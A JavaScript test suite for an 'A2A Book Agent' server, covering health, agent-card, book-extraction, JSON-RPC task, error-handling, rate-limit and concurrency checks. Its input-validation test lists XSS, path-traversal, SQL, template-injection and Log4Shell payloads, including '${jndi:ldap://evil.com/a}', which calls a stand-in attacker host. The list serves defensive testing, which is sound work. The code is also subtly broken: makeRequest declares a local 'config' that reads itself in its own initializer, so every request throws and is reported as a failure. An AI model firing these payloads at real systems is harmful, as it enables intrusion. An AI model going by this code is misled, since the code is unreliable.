#!/usr/bin/env node

/**
 * Comprehensive Test Suite for A2A Book Agent
 * 
 * This script tests all components of the A2A Book Agent to ensure
 * proper functionality before deployment.
 */

import axios from 'axios';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

// Get __dirname equivalent in ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Test configuration
const config = {
  baseUrl: process.env.TEST_BASE_URL || 'http://localhost:4111',
  timeout: 30000,
  retries: 3
};

// Test results tracking
const testResults = {
  passed: 0,
  failed: 0,
  total: 0,
  details: []
};

// Utility functions
function log(message, type = 'info') {
  const timestamp = new Date().toISOString();
  const prefix = {
    info: '📋',
    success: '✅',
    error: '❌',
    warning: '⚠️',
    progress: '🔄'
  }[type] || '📋';
  
  console.log(`${prefix} [${timestamp}] ${message}`);
}

function recordTest(name, passed, error = null) {
  testResults.total++;
  if (passed) {
    testResults.passed++;
    log(`PASSED: ${name}`, 'success');
  } else {
    testResults.failed++;
    log(`FAILED: ${name} - ${error}`, 'error');
  }
  
  testResults.details.push({
    name,
    passed,
    error,
    timestamp: new Date().toISOString()
  });
}

async function makeRequest(method, url, data = null, headers = {}) {
  try {
    const config = {
      method,
      url: `${config.baseUrl}${url}`,
      timeout: config.timeout,
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'A2A-Book-Agent-Test/1.0.0',
        ...headers
      }
    };
    
    if (data) {
      config.data = data;
    }
    
    const response = await axios(config);
    return { success: true, data: response.data, status: response.status, headers: response.headers };
  } catch (error) {
    return {
      success: false,
      error: error.message,
      status: error.response?.status,
      data: error.response?.data
    };
  }
}

async function retryRequest(method, url, data = null, headers = {}) {
  let lastError = null;
  
  for (let attempt = 1; attempt <= config.retries; attempt++) {
    try {
      const result = await makeRequest(method, url, data, headers);
      if (result.success) {
        return result;
      }
      lastError = result.error;
    } catch (error) {
      lastError = error.message;
    }
    
    if (attempt < config.retries) {
      log(`Attempt ${attempt} failed, retrying...`, 'warning');
      await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
    }
  }
  
  return { success: false, error: lastError };
}

// Test functions
async function testServerHealth() {
  log('Testing server health...', 'progress');
  
  const result = await makeRequest('GET', '/health');
  
  if (result.success && result.status === 200) {
    const health = result.data;
    const isValid = health.status === 'healthy' && 
                   health.service === 'a2a-book-agent' &&
                   health.version &&
                   health.uptime !== undefined;
    
    recordTest('Server Health Check', isValid, 
               !isValid ? 'Invalid health response format' : null);
    return isValid;
  } else {
    recordTest('Server Health Check', false, result.error || 'Invalid status code');
    return false;
  }
}

async function testAgentCard() {
  log('Testing agent card endpoint...', 'progress');
  
  const result = await makeRequest('GET', '/.well-known/agent.json');
  
  if (result.success && result.status === 200) {
    const card = result.data;
    const isValid = card.name &&
                   card.description &&
                   card.version &&
                   card.capabilities &&
                   card.executionUrl &&
                   Array.isArray(card.skills) &&
                   card.skills.length > 0;
    
    recordTest('Agent Card Endpoint', isValid,
               !isValid ? 'Invalid agent card format' : null);
    return isValid;
  } else {
    recordTest('Agent Card Endpoint', false, result.error || 'Invalid status code');
    return false;
  }
}

async function testBookExtractionAPI() {
  log('Testing book extraction API...', 'progress');
  
  const testQueries = [
    'Sherlock Holmes',
    'Pride and Prejudice',
    'Moby Dick',
    'Jane Austen',
    'Shakespeare'
  ];
  
  let allPassed = true;
  
  for (const query of testQueries) {
    log(`Testing query: "${query}"`, 'progress');
    
    const result = await makeRequest('POST', '/api/extract-book', {
      searchQuery: query
    });
    
    if (result.success && result.status === 200) {
      const data = result.data;
      const isValid = data.success &&
                     data.data &&
                     data.data.title &&
                     data.data.authors &&
                     data.data.excerpt &&
                     data.data.source === 'Project Gutenberg';
      
      recordTest(`Book Extraction - ${query}`, isValid,
                 !isValid ? 'Invalid book extraction response' : null);
      
      if (!isValid) allPassed = false;
    } else {
      recordTest(`Book Extraction - ${query}`, false, result.error || 'Request failed');
      allPassed = false;
    }
  }
  
  return allPassed;
}

async function testA2AMessageSend() {
  log('Testing A2A message/send method...', 'progress');
  
  const result = await makeRequest('POST', '/a2a/book-extractor-001', {
    jsonrpc: '2.0',
    method: 'message/send',
    params: {
      message: {
        role: 'user',
        parts: [{
          type: 'text',
          text: 'Find a book with: query: Romeo and Juliet'
        }]
      }
    },
    id: 'test_msg_send_001'
  });
  
  if (result.success && result.status === 200) {
    const response = result.data;
    const isValid = response.jsonrpc === '2.0' &&
                   response.result &&
                   response.result.task &&
                   response.result.task.id &&
                   response.result.task.status &&
                   response.result.message;
    
    recordTest('A2A Message Send', isValid,
               !isValid ? 'Invalid A2A message/send response' : null);
    return isValid;
  } else {
    recordTest('A2A Message Send', false, result.error || 'Request failed');
    return false;
  }
}

async function testA2ATaskOperations() {
  log('Testing A2A task operations...', 'progress');
  
  // First create a task
  const createResult = await makeRequest('POST', '/a2a/book-extractor-001', {
    jsonrpc: '2.0',
    method: 'message/send',
    params: {
      message: {
        role: 'user',
        parts: [{
          type: 'text',
          text: 'Find a book with: query: Hamlet'
        }]
      }
    },
    id: 'test_task_ops_001'
  });
  
  if (!createResult.success) {
    recordTest('A2A Task Operations', false, 'Failed to create task');
    return false;
  }
  
  const taskId = createResult.data.result.task.id;
  let allPassed = true;
  
  // Test tasks/get
  const getResult = await makeRequest('POST', '/a2a/book-extractor-001', {
    jsonrpc: '2.0',
    method: 'tasks/get',
    params: { id: taskId },
    id: 'test_task_get_001'
  });
  
  if (getResult.success && getResult.status === 200) {
    const isValid = getResult.data.result &&
                   getResult.data.result.id === taskId;
    recordTest('A2A Task Get', isValid,
               !isValid ? 'Invalid task/get response' : null);
    if (!isValid) allPassed = false;
  } else {
    recordTest('A2A Task Get', false, getResult.error || 'Request failed');
    allPassed = false;
  }
  
  // Test push notification config
  const configResult = await makeRequest('POST', '/a2a/book-extractor-001', {
    jsonrpc: '2.0',
    method: 'tasks/setPushNotificationConfig',
    params: {
      id: taskId,
      pushNotificationConfig: {
        url: 'https://example.com/webhook',
        authentication: {
          type: 'bearer',
          token: 'test-token'
        }
      }
    },
    id: 'test_push_config_001'
  });
  
  if (configResult.success && configResult.status === 200) {
    const isValid = configResult.data.result &&
                   configResult.data.result.pushNotificationConfig;
    recordTest('A2A Push Notification Config', isValid,
               !isValid ? 'Invalid push notification config response' : null);
    if (!isValid) allPassed = false;
  } else {
    recordTest('A2A Push Notification Config', false, configResult.error || 'Request failed');
    allPassed = false;
  }
  
  // Test task resubscribe
  const resubResult = await makeRequest('POST', '/a2a/book-extractor-001', {
    jsonrpc: '2.0',
    method: 'tasks/resubscribe',
    params: { id: taskId },
    id: 'test_resub_001'
  });
  
  if (resubResult.success && resubResult.status === 200) {
    const isValid = resubResult.data.result &&
                   resubResult.data.result.resubscribed === true;
    recordTest('A2A Task Resubscribe', isValid,
               !isValid ? 'Invalid task resubscribe response' : null);
    if (!isValid) allPassed = false;
  } else {
    recordTest('A2A Task Resubscribe', false, resubResult.error || 'Request failed');
    allPassed = false;
  }
  
  return allPassed;
}

async function testErrorHandling() {
  log('Testing error handling...', 'progress');
  
  const errorTests = [
    {
      name: 'Invalid Book Query',
      method: 'POST',
      url: '/api/extract-book',
      data: { searchQuery: '' },
      expectedStatus: 400
    },
    {
      name: 'Missing Search Query',
      method: 'POST',
      url: '/api/extract-book',
      data: {},
      expectedStatus: 400
    },
    {
      name: 'Invalid A2A Method',
      method: 'POST',
      url: '/a2a/book-extractor-001',
      data: {
        jsonrpc: '2.0',
        method: 'invalid/method',
        params: {},
        id: 'test_error_001'
      },
      expectedStatus: 200 // Should return error in JSON-RPC format
    },
    {
      name: 'Invalid Task ID',
      method: 'POST',
      url: '/a2a/book-extractor-001',
      data: {
        jsonrpc: '2.0',
        method: 'tasks/get',
        params: { id: 'invalid-task-id' },
        id: 'test_error_002'
      },
      expectedStatus: 200 // Should return error in JSON-RPC format
    },
    {
      name: 'Non-existent Endpoint',
      method: 'GET',
      url: '/non-existent-endpoint',
      data: null,
      expectedStatus: 404
    }
  ];
  
  let allPassed = true;
  
  for (const test of errorTests) {
    const result = await makeRequest(test.method, test.url, test.data);
    
    if (result.status === test.expectedStatus) {
      recordTest(`Error Handling - ${test.name}`, true);
    } else {
      recordTest(`Error Handling - ${test.name}`, false,
                 `Expected status ${test.expectedStatus}, got ${result.status}`);
      allPassed = false;
    }
  }
  
  return allPassed;
}

async function testInputValidation() {
  log('Testing input validation...', 'progress');
  
  const maliciousInputs = [
    '<script>alert("xss")</script>',
    'javascript:alert("xss")',
    'onclick=alert("xss")',
    '../../etc/passwd',
    'SELECT * FROM users',
    '${jndi:ldap://evil.com/a}',
    '{{7*7}}',
    '<img src=x onerror=alert("xss")>'
  ];
  
  let allPassed = true;
  
  for (const input of maliciousInputs) {
    const result = await makeRequest('POST', '/api/extract-book', {
      searchQuery: input
    });
    
    // Should either reject the input or sanitize it safely
    const isValid = result.status === 400 || 
                   (result.status === 200 && 
                    !result.data.data?.excerpt?.includes('<script>') &&
                    !result.data.data?.excerpt?.includes('javascript:'));
    
    recordTest(`Input Validation - ${input.substring(0, 20)}...`, isValid,
               !isValid ? 'Malicious input not properly handled' : null);
    
    if (!isValid) allPassed = false;
  }
  
  return allPassed;
}

async function testRateLimiting() {
  log('Testing rate limiting...', 'progress');
  
  // Make multiple rapid requests to test rate limiting
  const requests = [];
  for (let i = 0; i < 10; i++) {
    requests.push(makeRequest('GET', '/health'));
  }
  
  const results = await Promise.all(requests);
  const rateLimited = results.some(r => r.status === 429);
  
  // Rate limiting should kick in after many requests
  recordTest('Rate Limiting', rateLimited || results.every(r => r.success),
             !rateLimited && !results.every(r => r.success) ? 'Rate limiting not working properly' : null);
  
  return rateLimited || results.every(r => r.success);
}

async function testWorkflowJSON() {
  log('Testing Telex workflow JSON...', 'progress');
  
  try {
    const workflowPath = path.join(__dirname, 'telex-workflow.json');
    const workflowData = JSON.parse(fs.readFileSync(workflowPath, 'utf8'));
    
    const isValid = workflowData.id &&
                   workflowData.name &&
                   workflowData.description &&
                   workflowData.type &&
                   workflowData.data &&
                   workflowData.data.agentId &&
                   workflowData.data.endpoint &&
                   Array.isArray(workflowData.inputs) &&
                   Array.isArray(workflowData.outputs);
    
    recordTest('Telex Workflow JSON', isValid,
               !isValid ? 'Invalid workflow JSON structure' : null);
    
    return isValid;
  } catch (error) {
    recordTest('Telex Workflow JSON', false, error.message);
    return false;
  }
}

async function testConcurrentRequests() {
  log('Testing concurrent requests...', 'progress');
  
  const concurrentRequests = 5;
  const requests = [];
  
  for (let i = 0; i < concurrentRequests; i++) {
    requests.push(makeRequest('POST', '/api/extract-book', {
      searchQuery: `Test Book ${i}`
    }));
  }
  
  const results = await Promise.all(requests);
  const successCount = results.filter(r => r.success && r.status === 200).length;
  
  const isValid = successCount >= concurrentRequests * 0.8; // Allow for some failures
  
  recordTest('Concurrent Requests', isValid,
             !isValid ? `Only ${successCount}/${concurrentRequests} requests succeeded` : null);
  
  return isValid;
}

// Main test execution
async function runAllTests() {
  log('🚀 Starting A2A Book Agent Comprehensive Test Suite', 'info');
  log(`Testing server at: ${config.baseUrl}`, 'info');
  log('='.repeat(60), 'info');
  
  const tests = [
    { name: 'Server Health', fn: testServerHealth },
    { name: 'Agent Card', fn: testAgentCard },
    { name: 'Book Extraction API', fn: testBookExtractionAPI },
    { name: 'A2A Message Send', fn: testA2AMessageSend },
    { name: 'A2A Task Operations', fn: testA2ATaskOperations },
    { name: 'Error Handling', fn: testErrorHandling },
    { name: 'Input Validation', fn: testInputValidation },
    { name: 'Rate Limiting', fn: testRateLimiting },
    { name: 'Workflow JSON', fn: testWorkflowJSON },
    { name: 'Concurrent Requests', fn: testConcurrentRequests }
  ];
  
  for (const test of tests) {
    try {
      await test.fn();
    } catch (error) {
      recordTest(test.name, false, `Test execution error: ${error.message}`);
    }
    
    // Small delay between tests
    await new Promise(resolve => setTimeout(resolve, 500));
  }
  
  // Print final results
  log('='.repeat(60), 'info');
  log('📊 TEST RESULTS SUMMARY', 'info');
  log(`Total Tests: ${testResults.total}`, 'info');
  log(`Passed: ${testResults.passed}`, 'success');
  log(`Failed: ${testResults.failed}`, testResults.failed > 0 ? 'error' : 'info');
  log(`Success Rate: ${((testResults.passed / testResults.total) * 100).toFixed(1)}%`, 
      testResults.failed > 0 ? 'warning' : 'success');
  
  // Save detailed results to file
  const resultsPath = path.join(__dirname, `test-results-${Date.now()}.json`);
  fs.writeFileSync(resultsPath, JSON.stringify(testResults, null, 2));
  log(`Detailed results saved to: ${resultsPath}`, 'info');
  
  // Exit with appropriate code
  process.exit(testResults.failed > 0 ? 1 : 0);
}

// Handle uncaught errors
process.on('uncaughtException', (error) => {
  log(`Uncaught Exception: ${error.message}`, 'error');
  process.exit(1);
});

process.on('unhandledRejection', (reason, promise) => {
  log(`Unhandled Rejection: ${reason}`, 'error');
  process.exit(1);
});

// Run tests if this script is executed directly
if (import.meta.url === `file://${process.argv[1]}`) {
  runAllTests().catch(error => {
    log(`Test suite failed: ${error.message}`, 'error');
    process.exit(1);
  });
}

export {
  runAllTests,
  testServerHealth,
  testAgentCard,
  testBookExtractionAPI,
  testA2AMessageSend,
  testA2ATaskOperations,
  testErrorHandling,
  testInputValidation,
  testRateLimiting,
  testWorkflowJSON,
  testConcurrentRequests
};